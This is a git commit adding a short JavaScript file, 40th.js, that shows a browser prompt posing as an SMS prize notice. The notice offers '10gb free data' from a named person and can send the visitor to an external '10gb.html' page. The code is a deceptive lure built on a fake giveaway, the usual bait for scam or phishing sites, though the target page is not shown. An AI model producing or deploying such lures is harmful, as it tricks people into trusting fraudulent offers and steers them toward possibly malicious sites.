e1edeb63da43c1c1b6c143468816f900d0934c72
bigukpe <bigaka42@gmail.com>
2025-03-24 02:01:16 +0100

    Create 40th.js

---
+++ 40th.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 10GB'
+password=prompt('SMS! Congratulations, you have been select to receive 10gb free data from Richard Nii Armah. Kindly Press OK to ACTIVATE now   ','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://learnlivetech.org/10gb.html';
+}
